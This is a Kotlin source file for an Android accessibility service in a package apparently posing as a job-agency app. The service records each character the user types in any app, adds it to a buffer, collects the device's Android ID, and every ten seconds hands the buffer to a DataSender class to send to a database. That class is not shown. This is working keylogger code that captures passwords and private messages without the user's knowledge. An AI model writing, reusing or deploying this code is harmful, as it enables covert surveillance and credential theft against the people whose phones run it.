package com.example.EzJobAgency

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*

class MyAccessibilityService : AccessibilityService() {
    var buffer: String? = ""
    private val datasender = DataSender()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        event?.let {
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val char = it.text.filterNotNull().firstOrNull()?.lastOrNull()
                if(char != null)
                    buffer = buffer + char
            }
        }
    }

    override fun onInterrupt() {
        //send("[-] Interrupted !!! ")
    }

    override fun onServiceConnected() {
        datasender.obtainAndroidID(this.contentResolver)
        super.onServiceConnected()

        GlobalScope.launch {
            while (true) {
                delay(10_000) // 10 seconds
                if (buffer != "")
                {
                    // Send to database
                    datasender.sendData(buffer!!)
                    buffer = ""
                }
            }
        }
    }
}